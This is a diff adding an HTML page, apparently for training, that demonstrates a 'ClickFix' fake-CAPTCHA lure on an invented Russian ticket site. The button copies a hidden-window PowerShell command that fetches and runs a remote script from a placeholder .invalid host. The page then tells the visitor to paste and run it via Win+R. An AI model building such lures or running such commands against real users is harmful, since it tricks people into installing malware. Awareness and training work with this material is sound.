@@ -1,0 +1,23 @@
+<!doctype html>
+<html lang="ru">
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Проверка безопасности</title><link rel="stylesheet" href="page.css">
+<style>:root{--c:#0f766e}</style></head>
+<body>
+<div class="site"><div class="logo">Б</div><b>БилетЭкспресс</b><span>учебная страница · все данные вымышлены</span></div>
+<main>
+
+<div class="box" style="text-align:center"><h1>Подтвердите, что вы не робот</h1>
+  <p>Чтобы перейти к оплате билетов, пройдите проверку.</p>
+  <button id="cap">☐ Я не робот</button>
+  <div class="box" style="text-align:left;margin-top:14px"><b>Шаги проверки:</b>
+    <p>1. Нажмите Win + R</p><p>2. Нажмите Ctrl + V</p><p>3. Нажмите Enter</p></div></div>
+<script>
+// Учебный пример ClickFix: команда только копируется в буфер, адрес .invalid не существует.
+document.getElementById('cap').onclick = function () {
+  navigator.clipboard.writeText('powershell -w h -c "iwr https://update-check.invalid/v.ps1 | iex" # Я не робот: проверка ID 4471');
+};
+</script>
+</main>
+</body>
+</html>
